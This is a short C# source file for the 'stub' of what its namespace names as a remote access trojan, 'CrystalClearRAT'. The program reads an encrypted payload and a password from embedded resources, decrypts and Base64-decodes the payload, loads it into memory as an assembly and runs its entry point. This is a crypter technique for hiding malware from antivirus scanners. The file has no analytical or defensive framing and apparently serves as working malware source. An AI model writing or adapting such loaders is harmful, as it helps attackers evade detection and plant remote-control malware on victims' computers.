using System;
using System.IO;
using System.Reflection;
using System.Linq;
using System.Runtime.InteropServices;
using System.Collections.Generic;

namespace CrystalClearRAT.Stub
{
   
    class Program
    {



        public static void Main(string[] args)
        {

            var assembly = Assembly.GetExecutingAssembly();
            string payload = assembly.GetManifestResourceNames().Single(str => str.EndsWith("payload.txt"));
            string password = assembly.GetManifestResourceNames().Single(str => str.EndsWith("password.txt"));


            using (Stream stream = assembly.GetManifestResourceStream(password))
            using (StreamReader reader = new StreamReader(stream))
            {
                password = reader.ReadToEnd();
            }


            using (Stream stream = assembly.GetManifestResourceStream(payload))
            using (StreamReader reader = new StreamReader(stream))
            {
                string result = reader.ReadToEnd();
                byte[] code = Convert.FromBase64String(StringCipher.Decrypt(result, password));

               Assembly exeAssembly = Assembly.Load(code);
                exeAssembly.EntryPoint.Invoke(null, null);


            }

                  
        }
    }
}
